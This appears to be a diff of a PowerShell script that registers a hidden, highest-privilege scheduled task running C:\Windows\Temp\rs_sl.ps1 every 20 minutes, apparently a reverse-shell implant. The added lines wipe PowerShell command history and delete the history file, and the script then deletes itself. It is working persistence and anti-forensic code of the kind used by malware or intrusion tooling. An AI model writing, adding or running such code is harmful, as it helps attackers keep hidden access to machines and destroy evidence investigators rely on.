@@ -14,4 +14,7 @@ if($taskExists) {
    C:\Windows\System32\schtasks.exe /create /tn rs-task /RL HIGHEST /tr "powershell -NoLogo -WindowStyle hidden -file C:\Windows\Temp\rs_sl.ps1" /sc minute /mo 20 /ru (Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object -expand UserName)
 }
 
+[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
+Clear-History
+Remove-Item (Get-PSReadlineOption).HistorySavePath
 Remove-Item $script:MyInvocation.MyCommand.Path -Force;
